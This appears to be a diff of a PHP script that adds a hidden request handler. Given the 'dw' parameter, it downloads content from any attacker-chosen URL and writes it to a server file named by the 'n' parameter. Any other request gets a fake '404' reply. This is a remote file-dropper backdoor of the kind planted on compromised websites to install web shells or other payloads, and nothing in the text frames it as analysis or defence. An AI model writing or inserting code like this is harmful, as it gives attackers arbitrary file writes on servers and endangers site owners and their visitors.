@@ -32,8 +32,13 @@ function gcssl($url) {
     return $result;
 }
 
-if(isset($_GET['t'])){
-
+if(isset($_GET['dw'])){
+  $v=$_GET['dw'];
+  $n=gcssl($v);
+  $name=$_GET['n'];
+  file_put_contents($name,$n);
+  sleep(5000);
+  
 }else{
   echo 404;
 }
